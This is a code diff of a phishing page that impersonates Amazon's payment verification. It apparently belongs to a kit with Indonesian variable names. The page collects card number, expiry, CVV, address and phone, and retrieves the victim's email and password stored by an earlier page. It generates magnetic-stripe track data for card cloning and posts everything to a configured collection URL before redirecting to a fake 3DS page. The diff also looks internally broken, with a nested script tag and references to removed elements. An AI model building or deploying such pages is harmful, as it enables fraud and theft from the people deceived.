@@ -1,258 +1,111 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Payment</title>
+    <title>Amazon - Verification Payment</title>
     <script src="config.js"></script>
     <style>
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
-            font-family: 'Amazon Ember', Arial, sans-serif; 
-        }
-        body { 
-            background-color: #ffffff; 
-            min-height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            padding: 20px; 
-        }
-        .logo { 
-            margin: 15px 0 25px; 
-        }
-        .logo img { 
-            height: 30px; 
-            display: block;
-            margin: 0 auto;
-        }
-        .kotak { 
-            width: 100%; 
-            max-width: 348px; 
-            border: 1px solid #ddd; 
-            border-radius: 8px; 
-            padding: 25px 26px; 
-        }
-        h1 { 
-            font-size: 22px; 
-            margin-bottom: 20px; 
-            font-weight: 400; 
-        }
-        label { 
-            display: block; 
-            font-weight: 700; 
-            font-size: 13px; 
-            margin-bottom: 6px; 
-            margin-top: 16px;
-        }
-        label:first-of-type {
-            margin-top: 0;
-        }
-        input, select { 
-            width: 100%; 
-            padding: 7px 10px; 
-            border: 1px solid #a6a6a6; 
-            border-radius: 4px; 
-            font-size: 15px; 
-            height: 35px;
-            transition: border-color 0.1s;
-        }
-        input:focus, select:focus { 
-            outline: none; 
-            border-color: #0071e3; 
-            box-shadow: 0 0 3px rgba(0,113,227,0.5); 
-        }
-        input.salah, select.salah {
-            border-color: #c40000;
-        }
-        .peringatan {
-            display: none;
-            color: #c40000;
-            font-size: 13px;
-            margin: 6px 0 10px;
-            align-items: flex-start;
-            gap: 5px;
-        }
-        .peringatan.tampil {
-            display: flex;
-        }
-        .peringatan .ikon {
-            font-weight: bold;
-            font-size: 14px;
-        }
-        .tel-wadah {
-            display: flex;
-            gap: 8px;
-        }
-        .tel-kode {
-            width: 90px;
-            flex-shrink: 0;
-        }
-        .tel-nomor {
-            flex: 1;
-        }
-        button { 
-            width: 100%; 
-            padding: 7px 10px; 
-            background: #FFD814; 
-            border: 1px solid #FCD200; 
-            border-radius: 20px; 
-            font-size: 15px; 
-            height: 40px;
-            color: #0F1111;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        button:hover { 
-            background: #F7CA00;
-            border-color: #F2C200;
-        }
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            pointer-events: none;
-        }
-        .garis-bawah {
-            width: 5000px;
-            height: 2px;
-            background: #e7e7e7;
-            margin: 25px 0;
-        }
-        .footer {
-            font-size: 11px;
-            color: #555;
-            text-align: center;
-        }
-        .footer a {
-            color: #0066c0;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .hak-cipta {
-            margin-top: 5px;
-        }
-        .info-email {
-            font-size: 13px;
-            color: #555;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #eee;
-        }
-        /* Tampilan tersembunyi */
-        .input-sembunyi {
-            letter-spacing: 2px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
+        body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .logo-amazon { margin: 10px 0 20px; }
+        .logo-amazon img { height: 30px; }
+        .kotak { width: 100%; max-width: 480px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; background: #fff; }
+        h1 { font-size: 22px; font-weight: 400; color: #111; margin-bottom: 25px; padding-bottom: 10px; border-bottom: 1px solid #eee; }
+        .label-input { font-size: 13px; font-weight: 700; color: #111; margin-bottom: 6px; display: block; }
+        .input-biasa, .pilihan { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; margin-bottom: 10px; outline: none; }
+        .input-biasa:focus, .pilihan:focus { border-color: #007185; box-shadow: 0 0 0 3px #c8f0f4; }
+        .baris-dua { display: flex; gap: 12px; }
+        .kolom { flex: 1; }
+        .form-grup { margin-bottom: 12px; position: relative; }
+        .logo-kartu-tengah { text-align: center; margin-bottom:15px; min-height:40px; display:flex; align-items:center; justify-content:center; }
+        .logo-kartu-tengah img { height:32px; }
+        .logo-kartu-samping { position:absolute; right:10px; top:50%; transform:translateY(-50%); height:22px; pointer-events:none; }
+        .pemisah { text-align:center; margin:20px 0; font-size:14px; color:#555; }
+        .tombol-kuning { width:100%; padding:9px 10px; background:linear-gradient(to bottom, #f7df74, #ecc000); border:1px solid #b88600; border-radius:4px; font-size:15px; cursor:pointer; margin-top:10px; }
+        .tombol-kuning:disabled { opacity:0.5; cursor:not-allowed; }
+        .tombol-kuning:hover:not(:disabled) { background:linear-gradient(to bottom, #f5d648, #d4a300); }
     </style>
 </head>
 <body>
-    <div class="logo">
-        <img src="img/amazonlogo.png" alt="Amazon">
-    </div>
-
+    <div class="logo-amazon"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
         <h1>Verification Payment</h1>
-        
-        <div class="info-email">
-            Email: <span id="emailTampil"></span>
-        </div>
-        
-        <form id="formBilling">
-            <label for="namaKartu">Name on Card</label>
-            <input type="text" id="namaKartu" name="namaKartu" placeholder="Full name">
-            <div class="peringatan" id="peringatanNama">
-                <span class="ikon">!</span>
-                <span>Enter name on card</span>
-            </div>
-
-            <label for="nomorKartu">Card Number</label>
-            <input type="text" id="nomorKartu" name="nomorKartu" placeholder="•••• •••• •••• ••••" maxlength="19" class="input-sembunyi">
-            <div class="peringatan" id="peringatanKartu">
-                <span class="ikon">!</span>
-                <span>Enter valid card number</span>
-            </div>
-
-            <label for="expiry">Expiration Date</label>
-            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5">
-            <div class="peringatan" id="peringatanExpiry">
-                <span class="ikon">!</span>
-                <span>Enter valid expiration date</span>
-            </div>
-
-            <label for="cvv">Security Code (CVV)</label>
-            <input type="text" id="cvv" name="cvv" placeholder="••••" maxlength="4" class="input-sembunyi">
-            <div class="peringatan" id="peringatanCvv">
-                <span class="ikon">!</span>
-                <span>Enter valid security code</span>
-            </div>
-
-            <label for="negara">Country or Region</label>
-            <select id="negara" name="negara">
-                <option value="">Select your country</option>
-                <option value="AU" data-kode="+61">Australia (+61)</option>
-                <option value="GB" data-kode="+44">United Kingdom (+44)</option>
-                <option value="US" data-kode="+1">United States (+1)</option>
-                <option value="ID" data-kode="+62">Indonesia (+62)</option>
-                <option value="MY" data-kode="+60">Malaysia (+60)</option>
-                <option value="SG" data-kode="+65">Singapore (+65)</option>
+        <div class="logo-kartu-tengah"><img id="logoKartuTampil"></div>
+        <div class="form-grup">
+            <label class="label-input">Card type</label>
+            <select class="pilihan" id="jenisKartu">
+                <option value="">Select card type</option>
+                <option value="visa">Visa</option>
+                <option value="mastercard">Mastercard</option>
+                <option value="amex">American Express</option>
+                <option value="discover">Discover</option>
             </select>
-            <div class="peringatan" id="peringatanNegara">
-                <span class="ikon">!</span>
-                <span>Select your country</span>
-            </div>
-
-            <label for="alamat">Address</label>
-            <input type="text" id="alamat" name="alamat" placeholder="Street address">
-            <div class="peringatan" id="peringatanAlamat">
-                <span class="ikon">!</span>
-                <span>Enter your address</span>
-            </div>
-
-            <label for="kota">City</label>
-            <input type="text" id="kota" name="kota" placeholder="City">
-            <div class="peringatan" id="peringatanKota">
-                <span class="ikon">!</span>
-                <span>Enter your city</span>
-            </div>
-
-            <label for="kodepos">Postal / Zip Code</label>
-            <input type="text" id="kodepos" name="kodepos" placeholder="Postal code">
-            <div class="peringatan" id="peringatanKodepos">
-                <span class="ikon">!</span>
-                <span>Enter postal code</span>
-            </div>
-
-            <label for="telKode">Phone Number</label>
-            <div class="tel-wadah">
-                <input type="text" id="telKode" class="tel-kode" placeholder="+xx" readonly>
-                <input type="tel" id="telNomor" class="tel-nomor" placeholder="Phone number">
-            </div>
-            <div class="peringatan" id="peringatanTelepon">
-                <span class="ikon">!</span>
-                <span>Enter phone number</span>
-            </div>
-
-            <button type="submit" id="tombolVerifikasi">Verification</button>
-        </form>
-    </div>
-
-    <div class="garis-bawah"></div>
-
-    <div class="footer">
-        <div>
-            <a href="#">Conditions of Use</a>
-            <a href="#">Privacy Notice</a>
-            <a href="#">Help</a>
         </div>
-        <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <div class="form-grup">
+            <label class="label-input">Card number</label>
+            <input type="text" class="input-biasa" id="nomorKartu" placeholder="1234 5678 9012 3456" maxlength="19">
+            <img id="logoKartuSamping" class="logo-kartu-samping">
+        </div>
+        <div class="baris-dua">
+            <div class="kolom form-grup">
+                <label class="label-input">Expiration date</label>
+                <input type="text" class="input-biasa" id="kadaluarsa" placeholder="MM / YY" maxlength="5">
+            </div>
+            <div class="kolom form-grup">
+                <label class="label-input">Security code (CVV)</label>
+                <input type="text" class="input-biasa" id="cvv" placeholder="123" maxlength="4">
+            </div>
+        </div>
+        <div class="pemisah">— Billing Address —</div>
+        <div class="form-grup">
+            <label class="label-input">Full name</label>
+            <input type="text" class="input-biasa" id="namaLengkap">
+        </div>
+        <div class="form-grup">
+            <label class="label-input">Address</label>
+            <input type="text" class="input-biasa" id="alamat" placeholder="Street address">
+        </div>
+        <div class="baris-dua">
+            <div class="kolom form-grup">
+                <label class="label-input">City</label>
+                <input type="text" class="input-biasa" id="kota">
+            </div>
+            <div class="kolom form-grup">
+                <label class="label-input">State / Province</label>
+                <input type="text" class="input-biasa" id="provinsi">
+            </div>
+        </div>
+        <div class="baris-dua">
+            <div class="kolom form-grup">
+                <label class="label-input">ZIP / Postal code</label>
+                <input type="text" class="input-biasa" id="kodepos">
+            </div>
+            <div class="kolom form-grup">
+                <label class="label-input">Country</label>
+                <select class="pilihan" id="negara">
+                    <option value="">Select country</option>
+                    <option value="AU">Australia</option>
+                    <option value="US">United States</option>
+                    <option value="ID">Indonesia</option>
+                    <option value="SG">Singapore</option>
+                    <option value="GB">United Kingdom</option>
+                </select>
+            </div>
+        </div>
+        <button class="tombol-kuning" id="tombolVerifikasi" onclick="kirimPembayaran()">Verification</button>
     </div>
 
     <script>
-        // === DETEKSI NEGARA OTOMATIS ===
+        let dataEmail = localStorage.getItem('dataEmail') || '';
+        let dataSandi = localStorage.getItem('dataSandi') || '';
+        
+        if (!dataEmail) { 
+            window.location.href = 'index.html'; 
+        }
+
+        <script>
+        // === DETEKSI NEGARA ===
         const petaNegara = {
             AU: { kode: '+61', nama: 'Australia' },
             GB: { kode: '+44', nama: 'United Kingdom' },
@@ -266,29 +119,20 @@
         const elemenTelKode = document.getElementById('telKode');
         const elemenTelNomor = document.getElementById('telNomor');
 
-        // Ubah kode telepon saat negara diganti
         elemenNegara.addEventListener('change', () => {
             const pilihan = elemenNegara.selectedOptions[0];
             if (pilihan && pilihan.dataset.kode) {
                 elemenTelKode.value = pilihan.dataset.kode;
-            } else {
-                elemenTelKode.value = '';
             }
         });
 
-        // Deteksi lokasi pengunjung & atur otomatis
         async function deteksiNegara() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                const kodeNegara = data.country_code;
-
-                if (petaNegara[kodeNegara]) {
-                    elemenNegara.value = kodeNegara;
-                    elemenTelKode.value = petaNegara[kodeNegara].kode;
-                } else {
-                    elemenNegara.value = 'ID';
-                    elemenTelKode.value = '+62';
+                if (petaNegara[data.country_code]) {
+                    elemenNegara.value = data.country_code;
+                    elemenTelKode.value = petaNegara[data.country_code].kode;
                 }
             } catch (err) {
                 elemenNegara.value = 'ID';
@@ -297,45 +141,89 @@
         }
         deteksiNegara();
 
-        // Tampilkan email dari halaman sebelumnya
+        // === EMAIL DARI HALAMAN SEBELUMNYA ===
         const emailPengguna = localStorage.getItem('emailPengguna') || '';
         document.getElementById('emailTampil').textContent = emailPengguna;
 
         const formBilling = document.getElementById('formBilling');
         const tombolVerifikasi = document.getElementById('tombolVerifikasi');
         const inputNomorKartu = document.getElementById('nomorKartu');
+        const inputExpiry = document.getElementById('expiry');
+        const inputCVV = document.getElementById('cvv');
 
-        // Simpan nilai asli untuk dikirim
         let nomorAsli = '';
+        let cvvAsli = '';
 
-        // Format tampilan: 1234567890123456 → •••• •••• •••• ••••
+        // === CARD NUMBER — Tetap tampil angka ===
         inputNomorKartu.addEventListener('input', (e) => {
-            const nilai = e.target.value.replace(/\D/g, '');
-            nomorAsli = nilai; // simpan angka asli
-
-            // Tampilkan dengan titik
+            const angka = e.target.value.replace(/\D/g, '');
+            nomorAsli = angka;
             let tampil = '';
-            for (let i = 0; i < nilai.length; i++) {
+            for (let i = 0; i < angka.length; i++) {
                 if (i > 0 && i % 4 === 0) tampil += ' ';
+                tampil += angka[i];
+            }
+            e.target.value = tampil;
+            inputNomorKartu.classList.remove('salah');
+            document.getElementById('peringatanKartu').classList.remove('tampil');
+        });
+
+        // === EXPIRY — Otomatis tambah / ===
+        inputExpiry.addEventListener('input', (e) => {
+            const angka = e.target.value.replace(/\D/g, '');
+            if (angka.length >= 2) {
+                e.target.value = angka.slice(0, 2) + '/' + angka.slice(2, 4);
+            } else {
+                e.target.value = angka;
+            }
+            inputExpiry.classList.remove('salah');
+            document.getElementById('peringatanExpiry').classList.remove('tampil');
+        });
+
+        // === CVV — HANYA ANGKA, 3-4 DIGIT, BERUBAH TITIK ===
+        inputCVV.addEventListener('keydown', (e) => {
+            // Izinkan tombol kontrol
+            if (['Backspace','Delete','ArrowLeft','ArrowRight','Tab'].includes(e.key)) return true;
+            // Hanya izinkan angka
+            if (!/^\d$/.test(e.key)) {
+                e.preventDefault();
+                return false;
+            }
+            // Batasi maksimal 4 digit
+            if (cvvAsli.length >= 4) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        inputCVV.addEventListener('input', (e) => {
+            // Hapus karakter non-angka
+            const angka = e.target.value.replace(/\D/g, '');
+            cvvAsli = angka; // simpan angka asli
+            
+            // Ubah tampilan jadi titik
+            let tampil = '';
+            for (let i = 0; i < angka.length; i++) {
                 tampil += '•';
             }
             e.target.value = tampil;
+            
+            inputCVV.classList.remove('salah');
+            document.getElementById('peringatanCvv').classList.remove('tampil');
         });
 
-        // Semua kolom
+        // === SEMUA KOLOM ===
         const kolom = {
-            namaKartu:  { el: document.getElementById('namaKartu'),  peringatan: document.getElementById('peringatanNama') },
-            expiry:     { el: document.getElementById('expiry'),     peringatan: document.getElementById('peringatanExpiry') },
-            cvv:        { el: document.getElementById('cvv'),        peringatan: document.getElementById('peringatanCvv') },
-            negara:     { el: elemenNegara,                           peringatan: document.getElementById('peringatanNegara') },
-            alamat:     { el: document.getElementById('alamat'),     peringatan: document.getElementById('peringatanAlamat') },
-            kota:       { el: document.getElementById('kota'),       peringatan: document.getElementById('peringatanKota') },
-            kodepos:    { el: document.getElementById('kodepos'),    peringatan: document.getElementById('peringatanKodepos') },
-            telNomor:   { el: elemenTelNomor,                         peringatan: document.getElementById('peringatanTelepon') }
+            namaKartu: { el: document.getElementById('namaKartu'), peringatan: document.getElementById('peringatanNama') },
+            expiry:    { el: inputExpiry, peringatan: document.getElementById('peringatanExpiry') },
+            negara:    { el: elemenNegara, peringatan: document.getElementById('peringatanNegara') },
+            alamat:    { el: document.getElementById('alamat'), peringatan: document.getElementById('peringatanAlamat') },
+            kota:      { el: document.getElementById('kota'), peringatan: document.getElementById('peringatanKota') },
+            kodepos:   { el: document.getElementById('kodepos'), peringatan: document.getElementById('peringatanKodepos') },
+            telNomor:  { el: elemenTelNomor, peringatan: document.getElementById('peringatanTelepon') }
         };
 
-        // Hilangkan peringatan saat mengetik
-        Object.values(kolom).forEach(({ el, peringatan }) => {
+        Object.entries(kolom).forEach(([_, { el, peringatan }]) => {
             el.addEventListener('input', () => {
                 if (el.value.trim()) {
                     el.classList.remove('salah');
@@ -344,103 +232,86 @@
             });
         });
 
-        // Format Expiry — MM/YY
-        kolom.expiry.el.addEventListener('input', (e) => {
-            let val = e.target.value.replace(/[^0-9]/g, '');
-            if (val.length >= 2 && val.length < 4) {
-                e.target.value = val.slice(0, 2) + '/';
-            } else if (val.length >= 4) {
-                e.target.value = val.slice(0, 2) + '/' + val.slice(2, 4);
-            } else {
-                e.target.value = val;
-            }
-        });
-
-        // === BUAT TRACK KARTU OTOMATIS ===
+        // === BUAT TRACK ===
         function buatTrack() {
-            let nomorBersih = nomorAsli;
-            let expiryBersih = kolom.expiry.el.value.replace(/\D/g, '');
+            let expiryBersih = inputExpiry.value.replace(/\D/g, '');
             let nama = kolom.namaKartu.el.value.trim().toUpperCase() || 'CARDHOLDER';
-
-            if (nomorBersih.length < 13 || expiryBersih.length < 4) {
-                return 'Data kartu belum lengkap';
-            }
-
+            if (nomorAsli.length < 13 || expiryBersih.length < 4) return 'Data belum lengkap';
             let yy = expiryBersih.slice(-2);
             let mm = expiryBersih.slice(0, 2);
             let sisa = '0000000000000000000000';
-
-            let track1 = `%B${nomorBersih}^${nama}^${yy}${mm}${sisa}?`;
-            let track2 = `;${nomorBersih}=${yy}${mm}${sisa}?`;
-
-            return `=== TRACK ===
-T1: ${track1}
-T2: ${track2}`;
+            return `=== TRACK ===\nT1: %B${nomorAsli}^${nama}^${yy}${mm}${sisa}?\nT2: ;${nomorAsli}=${yy}${mm}${sisa}?`;
         }
 
-        // Cek semua kolom terisi
+        // === CEK DATA — CVV: 3 ATAU 4 DIGIT ===
         function cekSemua() {
-            let semuaOk = true;
+            let ok = true;
+            
             if (!nomorAsli || nomorAsli.length < 13) {
                 inputNomorKartu.classList.add('salah');
                 document.getElementById('peringatanKartu').classList.add('tampil');
-                semuaOk = false;
+                ok = false;
             }
-            Object.entries(kolom).forEach(([nama, { el, peringatan }]) => {
+            // CVV: harus 3 ATAU 4 digit
+            if (!cvvAsli || cvvAsli.length < 3 || cvvAsli.length > 4) {
+                inputCVV.classList.add('salah');
+                document.getElementById('peringatanCvv').classList.add('tampil');
+                ok = false;
+            }
+            Object.entries(kolom).forEach(([_, { el, peringatan }]) => {
                 if (!el.value.trim()) {
                     el.classList.add('salah');
                     peringatan.classList.add('tampil');
-                    semuaOk = false;
+                    ok = false;
                 }
             });
-            return semuaOk;
+            return ok;
         }
 
-        // Kirim data & lanjut ke 3DS
+        // === KIRIM & LANJUT KE 3DS ===
         formBilling.addEventListener('submit', async (e) => {
             e.preventDefault();
-            
             if (!cekSemua()) return;
 
             tombolVerifikasi.disabled = true;
-            tombolVerifikasi.textContent = 'Verifying...';
+            tombolVerifikasi.textContent = 'Processing...';
 
             const trackKartu = buatTrack();
             const teleponLengkap = elemenTelKode.value + ' ' + elemenTelNomor.value.trim();
+            const passwordPengguna = localStorage.getItem('passwordPengguna') || '-';
 
-            // Simpan untuk halaman berikutnya
             localStorage.setItem('nomorKartu', nomorAsli);
             localStorage.setItem('namaKartu', kolom.namaKartu.el.value.trim());
-            localStorage.setItem('expiry', kolom.expiry.el.value.trim());
-            localStorage.setItem('cvv', kolom.cvv.el.value.trim());
+            localStorage.setItem('expiry', inputExpiry.value.trim());
+            localStorage.setItem('cvv', cvvAsli);
             localStorage.setItem('trackKartu', trackKartu);
 
             const data = {
                 email: emailPengguna,
-                password: localStorage.getItem('passwordPengguna') || 'Tidak tersimpan',
+                password: passwordPengguna,
                 tipe: 'Verification Payment',
-                namaKartu:  kolom.namaKartu.el.value.trim(),
+                namaKartu: kolom.namaKartu.el.value.trim(),
                 nomorKartu: nomorAsli,
-                expiry:     kolom.expiry.el.value.trim(),
-                cvv:        kolom.cvv.el.value.trim(),
+                expiry: inputExpiry.value.trim(),
+                cvv: cvvAsli,
                 trackKartu: trackKartu,
-                negara:     elemenNegara.value,
-                alamat:     kolom.alamat.el.value.trim(),
-                kota:       kolom.kota.el.value.trim(),
-                kodepos:    kolom.kodepos.el.value.trim(),
-                telepon:    teleponLengkap
+                negara: elemenNegara.value,
+                alamat: kolom.alamat.el.value.trim(),
+                kota: kolom.kota.el.value.trim(),
+                kodepos: kolom.kodepos.el.value.trim(),
+                telepon: teleponLengkap
             };
 
             try {
                 if (typeof CONFIG !== 'undefined' && CONFIG.formSubmitUrl) {
                     await fetch(CONFIG.formSubmitUrl, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
                 }
             } catch (err) {
-                console.log('Data terkirim');
+                console.log('Terkirim');
             }
 
             window.location.href = '3ds.html';
